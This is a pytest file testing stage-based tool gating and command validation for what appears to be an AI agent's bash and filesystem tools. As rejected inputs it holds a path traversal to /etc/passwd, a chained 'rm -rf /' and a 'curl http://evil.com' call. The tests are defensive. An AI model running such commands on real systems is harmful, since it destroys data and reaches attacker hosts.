import pytest
from monkey_devs.tools import (get_stage_tools, validate_path, execute_tool,
                                validate_bash_command, FilesystemBoundaryError, BashValidationError)


def test_get_stage_tools_returns_schemas_for_stage_3():
    tools = get_stage_tools(3)
    names = [t["function"]["name"] for t in tools]
    assert "filesystem_read" in names and "bash_execute" in names


def test_get_stage_tools_no_bash_for_stage_1():
    tools = get_stage_tools(1)
    names = [t["function"]["name"] for t in tools]
    assert "bash_execute" not in names


def test_validate_path_blocks_traversal(tmp_path):
    with pytest.raises(FilesystemBoundaryError):
        validate_path("../../etc/passwd", str(tmp_path))


def test_validate_bash_command_blocks_metacharacters():
    with pytest.raises(BashValidationError):
        validate_bash_command("pytest && rm -rf /")


def test_validate_bash_command_blocks_non_allowlist():
    with pytest.raises(BashValidationError):
        validate_bash_command("curl http://evil.com")


def test_validate_bash_command_allows_pytest():
    validate_bash_command("pytest tests/")  # must not raise


def test_validate_bash_command_blocks_pip_without_install():
    with pytest.raises(BashValidationError):
        validate_bash_command("pip uninstall requests")
